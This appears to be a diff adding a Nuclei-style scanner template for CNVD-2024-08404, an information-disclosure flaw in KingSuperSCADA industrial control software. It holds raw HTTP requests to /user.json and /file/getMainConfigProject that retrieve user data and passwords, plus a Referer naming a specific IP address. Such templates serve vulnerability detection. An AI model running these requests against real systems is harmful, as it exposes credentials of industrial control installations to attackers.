@@ -1,0 +1,57 @@
+id: CNVD-2024-08404
+info:
+  name: KingSuperSCADA信息泄露 | CNVD-2024-08404
+  author: apple
+  severity: high
+  description: KingSuperSCADA存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。
+  reference:
+    - https://cn-sec.com/archives/2529140.html
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /user.json HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://118.186.13.182:9003/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=0, i
+        Connection: close
+
+      - |+
+        GET /file/getMainConfigProject HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://118.186.13.182:9003/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=0, i
+        Connection: close
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"message": "Success"'
+      - type: word
+        part: body
+        words:
+          - '"password":'
